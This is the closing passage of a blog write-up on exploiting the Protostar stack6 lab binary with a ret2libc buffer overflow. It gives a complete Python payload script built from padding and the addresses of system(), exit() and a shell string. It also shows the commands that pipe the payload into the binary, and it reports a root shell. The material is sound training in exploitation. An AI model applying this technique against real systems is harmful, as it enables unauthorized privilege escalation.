<p><code class="highlighter-rouge">buffer = "A" * 80</code></p>
<h4 id="then-we-will-create-3-variables-to-hold-the-addresses-of-system--exit-and-shell-we-will-use-struct-to-reverse-the-addresses">Then we will create 3 variables to hold the addresses of <code class="highlighter-rouge">system()</code> , <code class="highlighter-rouge">exit()</code> and <code class="highlighter-rouge">SHELL</code>. We will use struct to reverse the addresses.</h4>
<p><code class="highlighter-rouge">system = struct.pack("I" ,0xb7ecffb0)</code>
<br />
<br />
<code class="highlighter-rouge">exit = struct.pack("I" ,0xb7ec60c0)</code>
<br />
<br />
<code class="highlighter-rouge">shell = struct.pack("I" ,0xbffff985)</code></p>
<h4 id="and-finally-we-will-print-the-payload">And finally we will print the payload.</h4>
<p><code class="highlighter-rouge">print buffer + system + exit + shell</code></p>
<h4 id="final-script-">Final script :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
shell = struct.pack("I" ,0xbffff985)

print buffer + system + exit + shell
</code></pre></div></div>
<p><img src="/images/binary-exploitation/BOF6/12.png" alt="" /></p>
<h4 id="we-have-to-remember-that-the-address-of-shell-is-not-the-exact-address-and-we-will-need-to-go-up-or-down-for-a-little-bit-we-will-execute-the-script-and-redirect-the-output-to-a-file-and-name-it-payload-python-tmpstack6py--tmppayload--then-we-will-cat-the-file-and-pipe-the-output-to-stack6-">We have to remember that the address of <code class="highlighter-rouge">SHELL</code> is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. <code class="highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code> , Then we will cat the file and pipe the output to <code class="highlighter-rouge">./stack6</code> :</h4>
<p><img src="/images/binary-exploitation/BOF6/13.png" alt="" /></p>
<h4 id="and-no-shell--after-going-up-and-down-by-editing-the-address-in-the-python-script-i-finally-got-the-right-address-which-is-0xbffff992-">And no shell , After going up and down by editing the address in the python script I finally got the right address which is <code class="highlighter-rouge">0xbffff992</code> :</h4>
<p><code class="highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code>
<br />
<br />
<code class="highlighter-rouge">cat /tmp/payload - | ./stack6</code>
<img src="/images/binary-exploitation/BOF6/14.png" alt="" /></p>
<h4 id="root-shell">root shell!</h4>
<h4 id="so-after-editing-the-address-of-shell-variable--the-script-will-be-like-this-">So after editing the address of <code class="highlighter-rouge">shell</code> variable , the script will be like this :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
shell = struct.pack("I" ,0xbffff992)

print buffer + system + exit + shell
</code></pre></div></div>
<p><img src="/images/binary-exploitation/BOF6/15.png" alt="" />
<br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5">Previous Buffer Overflow article : <a href="/binary-exploitation/bof5/">Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/binary-exploitation/bof6/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

